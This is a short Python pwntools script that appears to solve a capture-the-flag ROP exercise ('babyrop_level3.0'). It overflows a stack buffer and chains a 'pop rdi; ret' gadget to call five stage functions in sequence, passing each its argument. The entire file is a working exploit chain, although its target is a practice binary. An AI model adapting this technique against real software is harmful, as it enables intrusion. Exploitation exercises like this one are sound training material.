from pwn import *

p = process("./babyrop_level3.0")

payload = b""
payload += b"A" * 112
payload += b"B" * 8
# pop rdi ; ret
payload += p64(0x402a93)
payload += p64(0x1)
# stage 1
payload += p64(0x4026a9)
# pop rdi ; ret
payload += p64(0x402a93)
payload += p64(0x2)
# stage 2
payload += p64(0x4024e3)
# pop rdi ; ret
payload += p64(0x402a93)
payload += p64(0x3)
# stage 3
payload += p64(0x40231e)
# pop rdi ; ret
payload += p64(0x402a93)
payload += p64(0x4)
# stage 4
payload += p64(0x4025c3)
# pop rdi ; ret
payload += p64(0x402a93)
payload += p64(0x5)
# stage 5
payload += p64(0x402400)

p.sendline(payload)

print(p.recvall())